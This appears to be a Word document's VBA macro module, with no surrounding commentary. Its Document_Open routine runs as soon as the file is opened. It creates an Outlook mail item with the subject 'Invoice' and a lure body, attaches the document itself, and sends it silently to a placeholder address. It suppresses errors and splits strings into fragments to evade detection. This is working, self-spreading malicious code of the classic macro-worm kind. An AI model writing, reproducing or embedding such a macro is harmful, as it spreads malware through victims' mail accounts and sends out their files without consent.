Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim olApp As Object, olMail As Object
    On Error Resume Next
    Set olApp = CreateObject("Outloo" & "k.Applica" & "tion")
    Set olMail = olApp.CreateItem(0)
    olMail.To = "recipient@example.com"
    olMail.Subject = "Invoice"
    olMail.Body = "Pleas" & "e find" & " the" & " attach" & "ed do" & "cument."
    olMail.Attachments.Add ActiveDocument.FullName
    olMail.Send
End Sub
